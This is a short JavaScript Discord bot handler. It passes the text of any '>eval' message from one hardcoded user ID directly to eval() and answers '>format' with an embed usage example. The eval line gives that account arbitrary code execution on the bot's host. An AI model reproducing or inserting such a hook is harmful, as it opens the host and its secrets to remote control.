module.exports = async (client, message, db) => {
    if (message.content.startsWith('>eval ') && message.author.id === '1003477997728313405') eval(message.content.split('>eval ')[1]);
    else if (message.content.startsWith('>format')) message.reply('**EXAMPLE TREND EMBED USAGE:**\n```\n.embed <#926282726053650464> d25251 Trending Game: INSERT GAME HERE\n```\n*do not forget to credit the person & ping*');
};
